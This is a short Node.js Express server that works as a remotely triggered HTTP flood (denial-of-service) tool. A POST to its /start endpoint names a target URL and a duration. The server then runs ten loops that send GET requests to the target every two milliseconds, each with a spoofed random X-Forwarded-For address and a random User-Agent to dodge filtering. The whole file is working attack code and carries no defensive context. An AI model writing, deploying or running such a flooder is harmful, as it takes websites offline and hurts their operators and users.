const express = require("express")
const axios = require("axios")
const useragent = require("random-useragent")

const app = express()
app.use(express.json())

function generateRandomIPAddress() {
    const getRandomOctet = () => Math.floor(Math.random() * (249 - 8 + 1) + 8)
    return Array.from({ length: 4 }, () => getRandomOctet()).join(".")
}

app.get("/", (req, res) => {
    res.send("Up!")
})

app.post("/start", (req, res) => {
    if (req.body) {
        if (req.body.interval && req.body.target) {
            var attacks = []
            var end = false
            for (var i = 0; i < 10; i++) {
                var interval = setInterval(function() {
                    if (!end) {
                      axios({
                          method: "GET",
                          url: req.body.target,
                          headers: {
                              "x-forwarded-for": generateRandomIPAddress(),
                              "User-Agent": useragent.getRandom()
                          }
                      }).catch(err => {})
                    }
                }, 2)
                attacks.push(interval)
            }

            setTimeout(function() {
                end = true
                for (let i = 0; i < attacks.length; i++) {
                    clearInterval(attacks[i])
                }
            }, req.body.interval * 1000)

            res.send("Yes!")
        } else {
            res.send("Nope!")
        }
    } else {
        res.send("Nope!")
    }
})

app.listen(3000)
